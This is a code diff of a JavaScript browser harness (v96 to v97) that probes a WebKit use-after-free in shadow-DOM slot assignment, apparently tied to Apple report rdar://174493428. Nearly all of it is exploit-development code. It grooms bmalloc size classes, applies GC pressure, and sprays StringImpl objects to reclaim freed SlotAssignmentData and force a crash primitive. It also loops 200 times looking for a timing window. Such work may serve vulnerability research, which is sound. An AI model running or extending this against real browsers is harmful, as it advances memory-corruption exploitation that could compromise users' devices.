+  log('  Goal: exhaust bmalloc 128B class → page with 1 live chunk','inf');
+  log('  → bmalloc decommits → chunk zeroed → *slot=0 → crash at null','inf');
+  log('');
+
+  const PRESOAK_COUNT = 160; // fill 1.25 × 16KB page of 128B chunks
+  const rigs = [];
+
+  log('  [1/4] pre-soak: creating '+PRESOAK_COUNT+' rigs (each = 1× 128B bucket)...','dim');
+  for(let i=0; i<PRESOAK_COUNT; i++){
+    rigs.push(makeRig(`cs${i}`, 4, true));
+  }
+  void RIG.getBoundingClientRect();
+  log('  [1/4] done. '+PRESOAK_COUNT+' × 128B HashMap buckets allocated.','ok');
+  await tick();
+
+  log('  [2/4] trigger first '+( PRESOAK_COUNT-1)+' rigs → free their 128B buckets...','dim');
+  let triggered = 0;
+  for(let i=0; i<PRESOAK_COUNT-1; i++){
+    const rig = rigs[i];
+    try {
+      const s3 = document.createElement('slot'); s3.name='primary';
+      rig.sr.insertBefore(s3, rig.slot1);
+    } catch(e){}
+    triggered++;
+  }
+  void RIG.getBoundingClientRect();
+  log(`  [2/4] done. ${triggered} buckets freed. 1 still live.`,'ok');
+  await tick();
+
+  log('  [3/4] GC pressure: allocate+release large buffers...','dim');
+  gcPressure(512); // 512 × 64KB = 32MB allocation pressure
+  await tick();
+  void RIG.getBoundingClientRect();
+  log('  [3/4] done.','ok');
+
+  log('  [4/4] trigger FINAL rig → its bucket is (hopefully) on decommitted page...','dim');
+  log('  IF crash: page will reload / Safari will crash → that IS the UAF signal','inf');
+  log('  IF no crash: post=0 again → bucket was NOT decommitted','dim');
+  log('  LOADING TRIGGER IN 1s...','sec');
+  await delay(1000);
+
+  const lastRig = rigs[PRESOAK_COUNT - 1];
+  let postLen = -2;
+  let threw = false;
+  try {
+    const s3 = document.createElement('slot'); s3.name='primary';
+    lastRig.sr.insertBefore(s3, lastRig.slot1);
+    void lastRig.host.getBoundingClientRect();
+    try { postLen = lastRig.slot1.assignedNodes().length; }
+    catch(e){ postLen=-999; threw=true; noteUAF('crash-pressure-post-threw'); }
+  } catch(e){ threw=true; noteUAF('crash-pressure-trigger-threw:'+e.message); }
+
+  log('');
+  const outcome = threw?'THREW(crash-path!)':postLen===0?'post=0(zeroed-but-no-crash)':'post='+postLen;
+  log(`  RESULT: ${outcome}`, threw?'hit':'ok');
+  if(!threw && postLen===0){
+    log('  bucket was NOT decommitted: bmalloc preserved value → live write to SlotAssignmentData','inf');
+    log('  Need higher pressure or different page occupancy to trigger decommit path','inf');
+  }
+  if(threw){
+    log('  CRASH PATH CONFIRMED: *slot=0 → null-deref → crash','hit');
+    log('  This is the UAF crash primitive for rdar://174493428','hit');
+  }
+
+  // Cleanup
+  for(const rig of rigs){
+    try{ RIG.removeChild(rig.host); }catch(_){}
+  }
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// C: ASYNC-TRIGGER
+// Can we force slot assignment to resolve LAZILY (in a separate microtask)
+// rather than synchronously, creating a window for JS to run between:
+//   (a) the moment slot assignment is SCHEDULED (we can spray here)
+//   (b) the moment slot assignment READS the freed bucket
+//
+// WebKit slot assignment resolution triggers on:
+//   - assignedNodes() / assignedElements() — synchronous
+//   - Layout/render — usually synchronous within the same frame
+//   - But: if we add children WITHOUT forcing layout, does it stay lazy?
+//
+// Test: make DOM mutations that SHOULD trigger slot assignment,
+// but DELAY layout force → spray between mutation and layout.
+// Then force layout → slot assignment resolves → UAF → reads our spray.
+//
+// The key question: does WebKit ever defer bucket-reads to a separate task?
+// ─────────────────────────────────────────────────────────────────────────────
+
+async function runAsyncTrigger(){
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  C: ASYNC-TRIGGER · lazy resolution window test              ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  log('  Can we create a window between DOM mutation and slot resolution?','inf');
+  log('  If yes: spray BETWEEN mutation (bucket freed) and resolution (bucket read).','inf');
+  log('');
+
+  const configs = [
+    // Method 1: mutate + spray + force layout (standard)
+    { label:'M1-std',    charLen:48, delay:0,   method:'std' },
+    // Method 2: mutate + microtask-delay + spray + force layout
+    { label:'M2-tick',   charLen:48, delay:'tick', method:'tick' },
+    // Method 3: mutate + raf + spray + force layout (next frame)
+    { label:'M3-raf',    charLen:48, delay:'raf',  method:'raf' },
+    // Method 4: mutate + 10ms + spray + force layout
+    { label:'M4-10ms',   charLen:48, delay:10,   method:'ms' },
+  ];
+
+  const sums = [];
+  for(const c of configs){
+    const r = await probeAsyncTrigger(c.label, c.charLen, c.delay);
+    log(`  [${c.label}] ${r.sig}`, r.hit?'hit':'ok');
+    sums.push(r);
+    await delay(30);
+  }
+
+  log('');
+  log('  KEY: if any method shows spray-corrupt → lazy resolution window exists.','inf');
+  log('  If ALL show spray-ok → slot resolution is ALWAYS synchronous.','inf');
+  dis(false);
+}
+
+async function probeAsyncTrigger(label, charLen, delaySpec){
+  const rig = makeRig(label, 4, true);
+  // Pre-spray (exists before trigger mutation)
+  const preSpray = [];
+  const frag = document.createDocumentFragment();
+  const base = 'X'.repeat(charLen);
+  for(let i=0; i<32; i++){
+    const el = document.createElement('span');
+    el.textContent = base + String(i).padStart(4,'0');
+    preSpray.push(el);
+    frag.appendChild(el);
+  }
+  RIG.appendChild(frag);
+  void RIG.getBoundingClientRect();
+
+  // DOM MUTATION: Add new named slot — this should schedule slot assignment
+  const s3 = document.createElement('slot'); s3.name='primary';
+  rig.sr.insertBefore(s3, rig.slot1);
+  // DO NOT force layout yet — maybe resolution is still deferred
+
+  // DELAY (try to create a window)
+  if(delaySpec === 'tick') await tick();
+  else if(delaySpec === 'raf') await raf();
+  else if(typeof delaySpec === 'number' && delaySpec > 0) await delay(delaySpec);
+  // else: no delay
+
+  // Post-mutation spray (may land in freed bucket if resolution was deferred)
+  const postSpray = [];
+  const frag2 = document.createDocumentFragment();
+  for(let i=0; i<32; i++){
+    const el = document.createElement('span');
+    el.textContent = base + String(i+100).padStart(4,'0');
+    postSpray.push(el);
+    frag2.appendChild(el);
+  }
+  RIG.appendChild(frag2);
+
+  // NOW force layout → triggers slot assignment resolution (if deferred)
+  void rig.host.getBoundingClientRect();
+
+  return new Promise(resolve => {
+    setTimeout(() => {
+      const expected = charLen + 4;
+      let preOk=0, preCorrupt=0, postOk=0, postCorrupt=0;
+      for(const el of preSpray){
+        try{ const t=el.textContent; (t&&t.length===expected&&t[0]==='X')?preOk++:preCorrupt++; }
+        catch(e){ preCorrupt++; noteUAF(`${label}-pre-threw`); }
+      }
+      for(const el of postSpray){
+        try{ const t=el.textContent; (t&&t.length===expected&&t[0]==='X')?postOk++:postCorrupt++; }
+        catch(e){ postCorrupt++; noteUAF(`${label}-post-threw`); }
+      }
+      // Cleanup
+      [...preSpray,...postSpray].forEach(el=>{ if(el.parentNode) el.parentNode.removeChild(el); });
+      try{ RIG.removeChild(rig.host); }catch(_){}
+
+      let postLen=-1;
+      try{ postLen=rig.slot1.assignedNodes().length; }catch(e){ postLen=-999; }
+
+      const sig = [
+        `delay=${delaySpec}`,
+        `pre:${preOk}ok/${preCorrupt}c`,
+        `post:${postOk}ok/${postCorrupt}c`,
+        postLen===0?'post=0':postLen===-999?'post=THREW':`post=${postLen}`,
+      ].join(' | ');
+      const hit = preCorrupt>0||postCorrupt>0||postLen===-999;
+      if(hit) noteUAF(`${label}-WINDOW-FOUND:pre-c=${preCorrupt}+post-c=${postCorrupt}`);
+      resolve({ sig, hit });
+    }, 100);
   });
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// PTR-WRITE TEST: look for non-zero textContent corruption
-// charLen=48 → 128B StringImpl (matches 4-unique-slot 128B bucket)
-// charLen=112 → 256B StringImpl (matches 8-unique-slot 256B bucket after grow)
+// D: SAD-SIZE — SlotAssignmentData size probe
+// SlotAssignmentData has:
+//   assignedNodes: Vector<WeakPtr<Node>> (24B on 64-bit: ptr+size+capacity)
+//   element: WeakPtr<HTMLSlotElement>   (8B)
+//   oldElement: WeakPtr<HTMLSlotElement> (8B)
+//   candidates: ...?
+//   Total: likely 40-48B → bmalloc class 64B (rounds up to power-of-2 ≥ size)
+//
+// We can infer the size class by grooming: pre-allocate N objects of size X,
+// trigger N SlotAssignmentData allocs, free them all, then see which size
+// class has exactly N freed chunks available.
+//
+// Simpler: spray many StringImls at specific sizes, trigger many SlotAssignmentData
+// allocs+frees. After freeing SlotAssignmentData, check if any StringImls at
+// that size get corrupted (would happen if SlotAssignmentData was in same class).
+//
+// charLen for sizes:
+//   16B: too small for StringImpl header (32B min)
+//   32B: charLen=0 (header only, no chars)
+//   48B: charLen=8 → 32+16=48B
+//   64B: charLen=16 → 32+32=64B
+//   96B: charLen=32 → 32+64=96B
 // ─────────────────────────────────────────────────────────────────────────────
-async function runPtrWrite() {
+
+async function runSADSize(){
   dis(true); uafTotal=0; L.innerHTML='';
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PTR-WRITE · slotchange-callback spray reclaim               ║','hi');
-  log('║  rdar://174493428 · v96                                      ║','hi');
+  log('║  D: SAD-SIZE · SlotAssignmentData size class probe           ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  log('  KEY: spray happens INSIDE slotchange callback, not before.','inf');
-  log('  At callback time: old bucket is freed, new bucket is live.','inf');
-  log('  Our alloc may reclaim the freed old bucket.','inf');
-  log('  If it does: C++ reads our chunk as SlotAssignmentData* → writes to our StringImpl.','inf');
-  log('  Detection: textContent of callback-spray elements corrupt after trigger.','inf');
+  log('  SlotAssignmentData estimated: ~40-48B → bmalloc class 64B','inf');
+  log('  Test: post-UAF, does any size class StringImpl show corruption?','inf');
+  log('  UAF writes: offset 0=null, 8=null, 12=null, 16=ptr, 32=null','inf');
+  log('  If StringImpl at same class as SlotAssignmentData: m_data overwritten','inf');
+  log('  If m_data overwritten: textContent.length will be wrong or crash','inf');
   log('');
 
-  const sums = [];
-  const configs = [
-    // 4 unique → OLD bucket = 128B. charLen=48 → 128B StringImpl.
-    { nu:4,  charLen:48,  label:'u4c48-128b' },
-    // 8 unique → OLD bucket = 256B. charLen=112 → 256B StringImpl.
-    { nu:8,  charLen:112, label:'u8c112-256b' },
-    // 3 unique → OLD bucket = 64B. charLen=16 → 64B StringImpl.
-    { nu:3,  charLen:16,  label:'u3c16-64b' },
-    // 2 unique → OLD bucket = 32B. charLen=0 → 32B StringImpl (header only).
-    { nu:2,  charLen:0,   label:'u2c0-32b' },
-    // Cross-size: 4 unique (128B old bucket) but spray 256B StringImpl
-    { nu:4,  charLen:112, label:'u4c112-cross' },
-    // 16 unique → OLD bucket = 512B. charLen=240 → 512B StringImpl.
-    { nu:16, charLen:240, label:'u16c240-512b' },
+  // For each size: create many rigs, trigger UAF, check if spray at this size
+  // shows any corruption AFTER the UAF fires (but checked in setTimeout = after SC)
+  const sizes = [
+    { charLen:0,  bytes:32, label:'32B' },
+    { charLen:8,  bytes:48, label:'48B' },
+    { charLen:16, bytes:64, label:'64B' },
+    { charLen:32, bytes:96, label:'96B' },
+    { charLen:48, bytes:128, label:'128B' },
   ];
 
-  for(const c of configs){
-    if(c.charLen === 0){
-      // Can't spray 0-char strings meaningfully, skip
-      log(`── ${c.label} SKIP (charLen=0) ──`, 'dim');
+  const sums = [];
+  for(const s of sizes){
+    if(s.charLen === 0){
+      log(`── ${s.label} SKIP (charLen=0) ──`,'dim');
       continue;
     }
-    log(`── ${c.label} ──`, 'dim');
-    const r = await probeSlotchangeSpray(c.label, c.nu, c.charLen);
-    const line = `[${c.label}] ${r.sig}`;
-    log(`  ${line}`, r.anyHit?'hit':'ok');
-    sums.push({ line, hit:r.anyHit });
-    await new Promise(r=>setTimeout(r,30));
+    const r = await probeSADSize(s.label, s.charLen);
+    log(`  [${s.label}] ${r.sig}`, r.hit?'hit':'ok');
+    sums.push({...r, bytes:s.bytes});
+    await delay(30);
   }
 
   log('');
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PTR-WRITE SUMMARY                                           ║','hi');
-  log('╠══════════════════════════════════════════════════════════════╣','hi');
-  for(const s of sums) log('║  '+s.line.substring(0,60).padEnd(60)+'║', s.hit?'hit':'ok');
-  log(`╠═ UAF signals: ${String(uafTotal).padEnd(46)}╣`,'hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('  If any size shows hit → SlotAssignmentData is in that bmalloc class.','inf');
+  log('  This tells us the exact size to spray for SlotAssignmentData reclaim.','inf');
   dis(false);
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// SIZE-SPLIT: vary numUnique to find the exact grow-threshold crossover
-// We want OLD bucket size ≠ NEW bucket size (different bmalloc class)
-// ─────────────────────────────────────────────────────────────────────────────
-async function runSplit() {
-  dis(true); uafTotal=0; L.innerHTML='';
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  SIZE-SPLIT · grow threshold + class boundary sweep          ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  numUnique controls how many entries → when trigger fires,','inf');
-  log('  adding a new named slot (via insertBefore) forces rehash if','inf');
-  log('  load factor exceeded. OLD bucket freed, NEW bucket 2× bigger.','inf');
-  log('  spraying in slotchange at OLD bucket size to reclaim freed chunk.','inf');
-  log('');
+async function probeSADSize(label, charLen){
+  const rig = makeRig(`sad${label}`, 4, true);
 
-  // For each numUnique: old capacity = nextPow2(numUnique*2+2), oldSize = oldCap*16
-  // After trigger adds 1 more named slot: newCap = nextPow2((numUnique+1)*2+2)
-  // If newCap != oldCap: old bucket freed to old size class, new in new size class
-  // At those boundaries, old bucket sits in free pool for our spray to reclaim
+  // Spray BEFORE trigger — we want to RECLAIM freed SlotAssignmentData
+  // For that: create spray, THEN somehow free SlotAssignmentData, THEN trigger.
+  // But we can't directly free SlotAssignmentData from JS...
+  //
+  // APPROACH: trigger the UAF → SlotAssignmentData is now "corrupted" (null-written)
+  // Does the slot ever GET freed? Only if the shadow root is destroyed or the slot removed.
+  // After trigger, REMOVE the slot → SlotAssignmentData freed → spray may reclaim it
+  // → If spray reclaimed it, the freed SlotAssignmentData's memory now belongs to our StringImpl
+  // → The UAF writes already happened (before we freed it), so no new writes
+  // → But: if we re-trigger the UAF on a NEW rig and SlotAssignmentData got reclaimed...
+  //
+  // Actually the useful order is:
+  // 1. Trigger UAF (so m_slots rehash happens, old buckets freed)
+  // 2. REMOVE slot from shadow root → slot's SlotAssignmentData freed
+  // 3. Spray at SAD size → reclaim freed SAD
+  // 4. Trigger ANOTHER UAF on a DIFFERENT rig
+  //    → If that rig's SlotAssignmentData is adjacent/reclaimed to our spray?
+  //    → No, it gets a new SlotAssignmentData, not our spray.
+  //
+  // SIMPLEST TEST: just trigger, remove slot, spray, check spray.
+  // If slotchange fires and writes to a spray object that was at SAD location → hit.
 
-  function nextPow2(n){ let p=1; while(p<n) p<<=1; return p; }
+  // Pre-trigger
+  let trigThrew = false;
+  try {
+    const s3 = document.createElement('slot'); s3.name='primary';
+    rig.sr.insertBefore(s3, rig.slot1);
+    void rig.host.getBoundingClientRect();
+  } catch(e){ trigThrew=true; noteUAF(`${label}-trig-threw`); }
 
-  const sums = [];
-  for(let nu=2; nu<=12; nu++){
-    // old state: numUnique unique slot names + 1 primaryChild
-    // trigger inserts ANOTHER named slot → total = numUnique+1 unique names
-    const oldCap = nextPow2((nu+1)*2);       // HashMap capacity before trigger
-    const newCap = nextPow2((nu+2)*2);       // HashMap capacity after trigger
-    const oldSize = oldCap * 16;
-    const newSize = newCap * 16;
-    // charLen for StringImpl matching oldSize: oldSize = 32 + charLen*2 → charLen = (oldSize-32)/2
-    const charLen = (oldSize - 32) / 2;
-    if(charLen <= 0 || charLen > 1000) continue;
+  // Remove slot1 → its SlotAssignmentData may get freed
+  if(rig.slot1.parentNode === rig.sr) rig.sr.removeChild(rig.slot1);
+  void rig.host.getBoundingClientRect();
 
-    const label = `u${nu}:old${oldSize}→new${newSize}:c${charLen}`;
-    const sameClass = (oldSize === newSize);
-
-    log(`── ${label} sameClass=${sameClass} ──`, 'dim');
-    const r = await probeSlotchangeSpray(label, nu, charLen);
-    const line = `[u${nu}:${oldSize}→${newSize}] sc=×${r.scFired} ${r.anyHit?'HIT':'clean'} | ${r.sig.substring(0,40)}`;
-    log(`  ${line}`, r.anyHit?'hit':(sameClass?'bad':'ok'));
-    sums.push({ line, hit:r.anyHit, sameClass });
-    await new Promise(r=>setTimeout(r,20));
+  // Post-free spray — may reclaim freed SAD memory
+  const spray = [];
+  const frag = document.createDocumentFragment();
+  const base = 'X'.repeat(charLen);
+  for(let i=0; i<64; i++){
+    const el = document.createElement('span');
+    el.textContent = base + String(i).padStart(4,'0');
+    spray.push(el);
+    frag.appendChild(el);
   }
+  RIG.appendChild(frag);
+  void RIG.getBoundingClientRect();
 
-  log('');
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  SIZE-SPLIT SUMMARY                                          ║','hi');
-  log('╠══════════════════════════════════════════════════════════════╣','hi');
-  for(const s of sums){
-    const marker = s.hit ? '!!HIT!!' : (s.sameClass ? 'SAME-CLASS' : 'clean');
-    log('║  '+(`${marker} ${s.line}`).substring(0,60).padEnd(60)+'║', s.hit?'hit':(s.sameClass?'inf':'ok'));
-  }
-  log(`╠═ UAF signals: ${String(uafTotal).padEnd(46)}╣`,'hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  dis(false);
-}
+  // Trigger a SECOND UAF (on a rig that still has a valid SAD at same class)
+  const rig2 = makeRig(`sad2${label}`, 4, true);
+  try {
+    const s4 = document.createElement('slot'); s4.name='primary';
+    rig2.sr.insertBefore(s4, rig2.slot1);
+    void rig2.host.getBoundingClientRect();
+  } catch(e){ noteUAF(`${label}-rig2-trig-threw`); }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// LOOP 200 — stress the best config (u4c48 — 128B old bucket)
-// ─────────────────────────────────────────────────────────────────────────────
-async function runLoop() {
-  dis(true); uafTotal=0; L.innerHTML='';
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  LOOP ×200 · u4c48 (128B) slotchange-spray stress            ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('  200 rounds, u4+c48 (128B spray in slotchange callback)','inf');
-  log('');
-
-  let ok=0, corrupt=0, threw=0, scFired=0, scNotFired=0;
-
-  for(let i=0; i<200; i++){
-    const r = await probeSlotchangeSpray(`lp${i}`, 4, 48);
-    if(r.scFired > 0) scFired++;
-    else scNotFired++;
-
-    if(r.scResult){
-      if(r.scResult.corrupted > 0 || r.scResult.threw > 0){
-        corrupt++;
-      } else {
-        ok++;
+  return new Promise(resolve => {
+    setTimeout(() => {
+      const expected = charLen + 4;
+      let ok=0, corrupt=0, threw=0;
+      const corruptIdx=[];
+      for(let i=0; i<spray.length; i++){
+        try {
+          const t = spray[i].textContent;
+          (t && t.length===expected && t[0]==='X')? ok++ : (corrupt++,corruptIdx.push(i));
+        } catch(e){ threw++; corruptIdx.push(i); noteUAF(`${label}-spray-threw`); }
       }
-    } else {
-      ok++; // sc not fired, no spray built
-    }
+      // Cleanup
+      spray.forEach(el=>{ if(el.parentNode) el.parentNode.removeChild(el); });
+      try{ RIG.removeChild(rig.host); }catch(_){}
+      try{ RIG.removeChild(rig2.host); }catch(_){}
+
+      const sig = [
+        `charLen=${charLen}`,
+        `ok=${ok} corrupt=${corrupt} threw=${threw}`,
+        corrupt>0||threw>0? `idx=[${corruptIdx.slice(0,5).join(',')}]` : '',
+      ].filter(Boolean).join(' | ');
+
+      const hit = corrupt>0||threw>0;
+      if(hit) noteUAF(`${label}-SAD-CLASS-HIT:corrupt=${corrupt}`);
+      resolve({ sig, hit });
+    }, 100);
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// E: LOOP ×200 — crash-pressure method, repeated
+// Watch for any run where the CRASH actually fires (page reload = victory)
+// ─────────────────────────────────────────────────────────────────────────────
+
+async function runLoop(){
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  E: LOOP ×200 · crash-pressure + async trigger stress        ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('  200 rounds of M3-raf (next-frame spray) looking for lazy window','inf');
+  log('');
+
+  let ok=0, hit=0;
+  for(let i=0; i<200; i++){
+    // Use raf method (most likely to create a timing window)
+    const r = await probeAsyncTrigger(`lp${i}`, 48, 'raf');
+    if(r.hit) hit++;
+    else ok++;
 
     if(i%50===49){
-      log(`  ${i+1}/200: ok=${ok} corrupt=${corrupt} threw_total=${threw} scFired=${scFired} scNotFired=${scNotFired}`, 'dim');
-      await new Promise(r=>setTimeout(r,0));
+      log(`  ${i+1}/200: ok=${ok} hit=${hit} uaf=${uafTotal}`, hit>0?'hit':'dim');
+      await tick();
     }
   }
 
   log('');
-  const anyHit = corrupt > 0 || threw > 0;
-  log(`  DONE 200: ok=${ok} corrupt=${corrupt} scFired=${scFired} scNotFired=${scNotFired} uaf=${uafTotal}`,
-      anyHit?'hit':'ok');
-  if(corrupt>0) log(`  CORRUPT=${corrupt} — slotchange-spray reclaim CONFIRMED. PTR WRITE LANDED.`, 'hit');
-  if(scNotFired>0) log(`  scNotFired=${scNotFired} — slotchange didn't fire in those rounds`, 'inf');
-  if(corrupt===0 && scFired===200) log(`  sc fired every round but no corruption — callback spray missed reclaim`, 'inf');
+  log(`  DONE 200: ok=${ok} hit=${hit} uaf=${uafTotal}`, hit>0?'hit':'ok');
+  if(hit > 0) log('  LAZY WINDOW CONFIRMED: spray landed before slot resolution', 'hit');
+  else log('  No lazy window found: slot resolution always synchronous with trigger', 'inf');
   dis(false);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────────────────
-async function runAll() {
+
+async function runAll(){
   dis(true); L.innerHTML=''; uafTotal=0;
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v96 RUN ALL · PTR-WRITE + SIZE-SPLIT + LOOP ×200            ║','hi');
+  log('║  v97 RUN ALL                                                  ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  await runPtrWrite();
+
+  log('━━━━━━━━━━━━ A: SC-TIMING ━━━━━━━━━━━━','hi');
+  await runSCTiming();
   log('');
-  log('━━━━━━━━━━━━ SIZE-SPLIT ━━━━━━━━━━━━','hi');
+  log('━━━━━━━━━━━━ B: CRASH-PRESSURE ━━━━━━━━━━━━','hi');
+  await runCrashPressure();
   log('');
-  await runSplit();
+  log('━━━━━━━━━━━━ C: ASYNC-TRIGGER ━━━━━━━━━━━━','hi');
+  await runAsyncTrigger();
   log('');
-  log('━━━━━━━━━━━━ LOOP ×200 ━━━━━━━━━━━━','hi');
+  log('━━━━━━━━━━━━ D: SAD-SIZE ━━━━━━━━━━━━','hi');
+  await runSADSize();
   log('');
+  log('━━━━━━━━━━━━ E: LOOP ×200 ━━━━━━━━━━━━','hi');
   await runLoop();
   dis(false);
 }
